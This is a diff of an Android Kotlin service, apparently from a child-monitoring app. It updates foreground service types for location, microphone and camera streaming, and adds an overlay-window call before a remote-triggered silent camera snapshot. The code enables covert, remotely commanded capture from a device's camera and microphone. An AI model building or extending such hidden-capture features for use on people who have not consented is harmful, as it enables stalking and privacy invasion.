@@ -353,7 +353,8 @@ class ChildForegroundService : Service() {
 
     private fun getIdleServiceType(): Int {
         var type = 0
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
             if (hasLocationPermission()) {
                 type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
             }
@@ -367,7 +368,18 @@ class ChildForegroundService : Service() {
 
     private fun getStreamingServiceType(streamType: String): Int {
         var type = 0
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            if (hasLocationPermission()) {
+                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+            }
+            if (hasMicrophonePermission()) {
+                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            }
+            if (hasCameraPermission() && streamType.equals("video", ignoreCase = true)) {
+                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+            }
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (hasLocationPermission()) {
                 type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
             }
@@ -713,6 +725,7 @@ class ChildForegroundService : Service() {
         // Listen for Remote Snapshot requests (Phase 1)
         if (snapshotRequestListener == null) {
             snapshotRequestListener = FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
+                ensureOverlayWindow()
                 val isFront = cameraFacing.equals("front", ignoreCase = true)
                 com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
                     isFront = isFront,
